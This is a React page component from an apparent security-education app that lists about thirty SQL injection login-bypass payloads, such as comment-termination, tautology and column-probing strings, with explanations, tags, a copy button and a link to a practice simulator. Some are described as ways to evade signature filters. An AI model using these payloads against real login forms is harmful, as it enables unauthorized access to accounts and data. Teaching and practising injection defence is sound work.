import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import { ArrowLeft, HelpCircle, Copy, Check, Search } from 'lucide-react';

const payloadSections = [
  {
    id: 'original-comment-exploits',
    title: 'Original Comment Exploits',
    description: 'Database engines use comment markers to ignore text in queries. Comment exploits inject these markers to terminate queries early and bypass subsequent logic checks, such as password verification.',
    payloads: [
      { code: "admin' -- ", desc: "Double-dash comment. Escapes single quote and tells database parser to ignore the rest of the query.", tags: ['Comment', 'Standard'] },
      { code: "admin' #", desc: "MySQL-specific hash comment to ignore subsequent parts of the query.", tags: ['MySQL', 'Hash'] },
      { code: "admin'-- ", desc: "Inline double-dash comment without trailing space, valid under certain SQL parsers.", tags: ['Comment', 'Inline'] },
      { code: "admin'/*", desc: "Multiline comment start token used to comment out remaining SQL queries.", tags: ['Inline', 'Block'] },
      { code: "admin' -- -", desc: "Appends trailing hyphens to double-dash comment to ensure database compatibility.", tags: ['Comment', 'Compatible'] },
      { code: "admin' # #", desc: "Multiple hash tokens to bypass strict comment validation filters.", tags: ['Bypass', 'MySQL'] },
      { code: "user' -- ", desc: "Comment-bypass targeting standard 'user' account parameters.", tags: ['Comment', 'Targeted'] },
      { code: "administrator' -- ", desc: "Comment-bypass targeting default 'administrator' accounts.", tags: ['Comment', 'Targeted'] },
      { code: "root' -- ", desc: "Comment-bypass targeting the database superuser account 'root'.", tags: ['Comment', 'Targeted'] },
      { code: "' OR 1=1 -- ", desc: "Combines standard logic tautology with double-dash comment termination.", tags: ['Logical', 'Tautology'] },
      { code: "admin'; -- ", desc: "Semicolon separator followed by double-dash comment sequence.", tags: ['Semicolon', 'Comment'] },
      { code: "admin' OR '1'='1' -- ", desc: "Combined string tautology evaluation with double-dash comment.", tags: ['Logical', 'Tautology'] }
    ]
  },
  {
    id: 'additional-comment-payloads',
    title: 'Additional Comment Payloads',
    description: 'Extended and layered comment patterns, enclosing variants, and structural probing clauses. These verify comment boundaries, operator precedence, and bypass signature-based filters.',
    payloads: [
      { code: "admin' -- /*", desc: "Chains a double-dash comment with a block comment start token to confuse sanitizers.", tags: ['Chained', 'Bypass'] },
      { code: "admin' # -- ", desc: "Chains MySQL hash comment with standard double-dash characters.", tags: ['Chained', 'MySQL'] },
      { code: "admin'/* -- ", desc: "Chains block comment start with double-dash comment characters.", tags: ['Chained', 'Block'] },
      { code: "admin' -- --", desc: "Appends multiple double-dash sequences to ensure query parsing termination.", tags: ['Comment', 'Multiple'] },
      { code: "admin' OR 1=1 -- ", desc: "Logical integer tautology check combined with double-dash comment termination.", tags: ['Logical', 'Tautology'] },
      { code: "admin') -- ", desc: "Closes parenthesized username logic before commenting out password validation.", tags: ['Parenthesis', 'Targeted'] },
      { code: "admin')) -- ", desc: "Closes double-parenthesized query constructs prior to comment termination.", tags: ['Parenthesis', 'Targeted'] },
      { code: "' OR '1'='1' -- ", desc: "Generic string comparison tautology followed by double-dash comment.", tags: ['Logical', 'Tautology'] },
      { code: "1' OR '1'='1' -- ", desc: "Breakout query starting with a numeric parameter, followed by string comparison and comment.", tags: ['Logical', 'Numeric'] },
      { code: "admin' ; -- ", desc: "Targeted stacked query spacing separator followed by standard comment.", tags: ['Semicolon', 'Comment'] },
      { code: "admin' -- #", desc: "Bypasses signature detection by chaining standard comment with a hash symbol.", tags: ['Chained', 'Bypass'] },
      { code: "admin' # /*", desc: "Chains hash comment with block comment character sequence to terminate the query.", tags: ['Chained', 'MySQL'] },
      { code: "root' OR '1'='1' -- ", desc: "Targeted superuser account bypass using string comparison and double-dash comment.", tags: ['Logical', 'Tautology'] },
      { code: "guest' -- ", desc: "Comment-bypass targeting default low-privilege 'guest' accounts.", tags: ['Comment', 'Targeted'] },
      { code: "test' -- ", desc: "Comment-bypass targeting testing accounts like 'test'.", tags: ['Comment', 'Targeted'] },
      { code: "'admin' -- ", desc: "Escapes and encapsulates query parameters inside single quotes followed by standard comment.", tags: ['Enclosed', 'Comment'] },
      { code: "admin' ORDER BY 1 -- ", desc: "Comment-terminated query used to probe table column counts for UNION attacks.", tags: ['Order By', 'Probing'] },
      { code: "admin' GROUP BY 1 -- ", desc: "Comment-terminated query using grouping clauses to probe table columns.", tags: ['Group By', 'Probing'] }
    ]
  }
];

export default function CommentAttackPayloads() {
  const [copiedText, setCopiedText] = useState(null);
  const [searchTerm, setSearchTerm] = useState('');

  const allPayloads = [];
  payloadSections.forEach(section => {
    section.payloads.forEach(p => {
      allPayloads.push({
        ...p,
        sectionId: section.id,
        sectionTitle: section.title
      });
    });
  });

  const filteredPayloads = allPayloads.filter((p) => {
    const query = searchTerm.toLowerCase();
    return (
      p.code.toLowerCase().includes(query) ||
      p.desc.toLowerCase().includes(query) ||
      p.tags.some((t) => t.toLowerCase().includes(query))
    );
  });

  const handleCopy = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 2000);
  };

  return (
    <div className="space-y-10 select-none w-full max-w-5xl mx-auto">
      {/* Back Link */}
      <div className="flex items-center justify-between">
        <Link to="/payload-library" className="inline-flex items-center gap-2 text-xs font-mono text-cyber-dim hover:text-cyber-blue transition-colors">
          <ArrowLeft className="w-3.5 h-3.5" />
          back to payload library dashboard
        </Link>
        <span className="text-[10px] font-mono text-cyber-dim">MODULE: COMMENT_NEUTRALIZATION_v1.0</span>
      </div>

      {/* Header Info */}
      <div className="flex flex-col gap-2 border-b border-cyber-border/40 pb-6 w-full relative">
        <div className="absolute -top-4 right-0 w-24 h-24 bg-cyber-blue/10 blur-[40px] rounded-full pointer-events-none" />
        <span className="text-xs font-mono font-bold text-cyber-blue tracking-[4px] uppercase flex items-center gap-2">
          <HelpCircle className="w-4.5 h-4.5 text-cyber-blue" />
          MODULE 06 — COMMENT-BASED VARIATiONS
        </span>
        <h1 className="text-3xl font-extrabold text-cyber-title tracking-wide uppercase">
          Comment Attack <span className="text-cyber-blue">Payloads</span>
        </h1>
        <p className="text-cyber-dim text-sm text-justify leading-relaxed">
          DBMS-specific comment tokens (#, --, /* */) used to neutralize password filters and terminate active strings safely.
        </p>
      </div>

      {/* Interactive Search Bar */}
      <div className="relative w-full max-w-md">
        <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-cyber-dim/60" />
        <input
          type="text"
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          placeholder="Search comment payloads..."
          className="w-full bg-cyber-input border border-cyber-border rounded-lg pl-10 pr-4 py-2.5 text-cyber-text placeholder-cyber-dim/40 focus:outline-none focus:border-cyber-blue focus:ring-1 focus:ring-cyber-blue/20 transition-all text-xs font-mono"
        />
      </div>

      {/* Main Payload Grid Section */}
      <div className="space-y-6">
        <div className="bg-cyber-card border border-cyber-border rounded-xl overflow-hidden shadow-lg">
          <div className="grid grid-cols-12 gap-3 px-6 py-3 border-b border-cyber-border bg-cyber-pre text-[10px] font-mono font-bold text-cyber-dim tracking-wider uppercase">
            <div className="col-span-4">Payload (SQL Code)</div>
            <div className="col-span-5">Mechanism & Impact Description</div>
            <div className="col-span-2">Tags</div>
            <div className="col-span-1 text-right">Actions</div>
          </div>

          <div className="divide-y divide-cyber-border/40 font-mono text-sm">
            {filteredPayloads.length > 0 ? (
              filteredPayloads.map((payload, pIdx) => (
                <div
                  key={pIdx}
                  className="grid grid-cols-12 gap-3 px-6 py-4 items-center hover:bg-cyber-blue/[0.02] transition-colors group"
                >
                  {/* Payload Code */}
                  <div className="col-span-4 select-text">
                    <code className="text-cyber-blue-light font-bold bg-cyber-pre/80 px-2.5 py-1.5 rounded-lg border border-cyber-border/60 block overflow-x-auto whitespace-nowrap">
                      {payload.code}
                    </code>
                  </div>

                  {/* Description */}
                  <div className="col-span-5 text-xs text-cyber-text leading-relaxed select-text font-sans">
                    {payload.desc}
                  </div>

                  {/* Tags */}
                  <div className="col-span-2 flex flex-wrap gap-1">
                    {payload.tags.map((tag, tIdx) => (
                      <span
                        key={tIdx}
                        className="text-[9px] font-bold uppercase tracking-wider bg-cyber-blue/10 border border-cyber-blue/20 text-cyber-blue-light px-1.5 py-0.2 rounded"
                      >
                        {tag}
                      </span>
                    ))}
                  </div>

                  {/* Actions */}
                  <div className="col-span-1 flex items-center justify-end gap-2">
                    <button
                      onClick={() => handleCopy(payload.code)}
                      className="p-1.5 rounded bg-cyber-pre border border-cyber-border hover:border-cyber-blue hover:bg-cyber-blue/5 text-cyber-dim hover:text-cyber-blue-light transition-all cursor-pointer relative"
                      title="Copy payload to clipboard"
                    >
                      {copiedText === payload.code ? (
                        <Check className="w-3.5 h-3.5 text-cyber-green" />
                      ) : (
                        <Copy className="w-3.5 h-3.5" />
                      )}
                    </button>
                  </div>
                </div>
              ))
            ) : (
              <div className="px-6 py-12 text-center text-cyber-dim font-mono text-sm">
                No matching payloads found for "{searchTerm}"
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Sandbox Redirection */}
      <div className="bg-cyber-card border border-cyber-border/70 rounded-2xl p-8 text-center space-y-5 shadow-2xl relative overflow-hidden">
        <span className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyber-blue to-transparent" />
        <h3 className="font-sans font-extrabold text-lg text-cyber-title tracking-wider uppercase">
          Simulate this in our Interactive Comment-Based Environment!
        </h3>
        <p className="text-sm text-cyber-text text-justify leading-relaxed">
          Test these payloads inside our live Comment-Based Simulator to witness real-time character neutralization, query execution stages, and verify authentication bypass mechanisms!
        </p>
        <div className="pt-2 flex justify-center">
          <Link
            to="/attacks/comment-attack"
            className="inline-flex items-center justify-center gap-2 bg-cyber-blue hover:bg-cyber-blue-light text-white px-8 py-3.5 rounded-xl text-xs font-bold uppercase tracking-wider transition-all cursor-pointer shadow-[0_0_15px_rgba(26,106,255,0.3)] hover:shadow-[0_0_25px_rgba(26,106,255,0.5)] transform hover:-translate-y-0.5"
          >
            Launch Live Comment Attack Simulator
          </Link>
        </div>
      </div>
    </div>
  );
}
